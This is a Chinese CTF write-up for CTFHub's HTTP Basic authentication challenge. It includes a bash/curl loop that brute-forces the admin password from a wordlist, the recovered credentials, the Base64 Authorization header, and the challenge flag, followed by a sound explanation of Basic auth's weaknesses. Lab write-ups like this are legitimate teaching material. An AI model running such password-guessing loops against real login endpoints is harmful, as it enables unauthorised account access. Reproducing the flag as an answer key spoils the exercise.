# WP：基础认证

> **CTFHub 路径**：技能树 → Web → Web 前置技能 → HTTP 协议 → 基础认证
> **任务**：按题目提示完成 HTTP Basic 认证，拿到 flag。
> **提示**：观察 `401 Unauthorized` 响应和 `WWW-Authenticate: Basic` 响应头。Basic 认证把 `用户名:密码` 做 Base64 编码后放在 `Authorization` 请求头里，Base64 不是加密。
> **截图要求**：能看到 `Authorization: Basic ...` 请求头，以及认证成功后的 flag 或页面。

---

## 题目信息

| 项目 | 内容 |
| --- | --- |
| 环境地址 | http://challenge-acac02d0929810ba.sandbox.ctfhub.com:10800/ |
| Flag | ctfhub{bfaadf32b3b81d542563d355} |

## 解题过程

开启题目后访问靶场，首页没提示什么，但直接请求 `/flag.html` 会要求认证，响应是 `401 Unauthorized`，并带着 `WWW-Authenticate: Basic realm="..."`，告诉浏览器这里要走 Basic 认证。题目给了用户名 `admin`，密码没给，只提示可以跑字典，所以我先用 dirb 扫了一遍站点、确认 `/flag.html` 是那个受保护的页面。然后在 Kali 里写了一个 while 循环，拿自带的 `10_million_password_list_top_100.txt` 逐个当密码去请求，只看返回码：不是 200 就继续，是 200 就停下来打印密码，跑到 `soccer` 时命中（屏幕上打出 `FOUND:soccer`）。最后用 `curl -u admin:soccer` 请求 `/flag.html`，响应里就是 flag。

## 关键请求/响应

```http
（1）不带凭据：被拒绝
GET /flag.html HTTP/1.1
Host: challenge-acac02d0929810ba.sandbox.ctfhub.com:10800

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Authentication"

（2）爆破：只看返回码
$ while read pw; do code=$(curl -s -o /dev/null -w %{http_code} \
    -u admin:$pw http://challenge-acac02d0929810ba.sandbox.ctfhub.com:10800/flag.html); \
    [ "$code" = 200 ] && echo FOUND:$pw && break; done < 10_million_password_list_top_100.txt
FOUND:soccer

（3）用猜到的密码完成认证：curl -u 会自动生成 Authorization 头
$ curl -s -u admin:soccer http://challenge-acac02d0929810ba.sandbox.ctfhub.com:10800/flag.html

GET /flag.html HTTP/1.1
Host: challenge-acac02d0929810ba.sandbox.ctfhub.com:10800
Authorization: Basic YWRtaW46c29jY2Vy

HTTP/1.1 200 OK

ctfhub{bfaadf32b3b81d542563d355}
```

其中 `YWRtaW46c29jY2Vy` 就是 `admin:soccer` 的 Base64，用 `echo YWRtaW46c29jY2Vy | base64 -d` 一条命令就能还原成明文。

## 原理与复盘

Basic 认证把“用户名:密码”先拼成 `用户名:密码` 这样的字符串，再做 Base64 编码，然后放进请求头 `Authorization: Basic <base64>` 里发出去。Base64 只是编码不是加密，任何人拿到就能一条命令解回明文，所以它必须跑在 HTTPS 上，否则等于明文传输；也正因为每次请求都要带完整凭据，密码一旦弱，就能像上面那样用字典几百次请求全部试一遍。第一次不带凭据访问时，服务器返回 401 并用 `WWW-Authenticate: Basic` 告诉浏览器“这里要登录”，浏览器才会弹出登录框——认证状态完全由这个请求头维持，不依赖 Cookie 或 Session。

---

## 截图

![基础认证](../imgs/lab5_basic_auth.png)

> 可以在这份 WP 中另加过程截图；检查时只看指定图片，额外图片不检查。
